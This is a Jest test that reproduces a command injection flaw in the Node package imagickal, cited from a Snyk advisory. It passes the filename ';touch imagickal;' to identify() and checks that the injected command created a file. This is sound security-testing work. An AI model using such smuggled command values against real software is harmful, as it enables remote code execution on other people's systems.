//https://security.snyk.io/vuln/SNYK-JS-IMAGICKAL-1060040
test("Remote code execution in imagickal", () => {
  const im = require("imagickal");
  const fs = require("fs");
  const path = "./imagickal";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    im.identify(";touch imagickal;").then(function (data) {});
  } catch (error) {}
  sleep.sleep(3);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
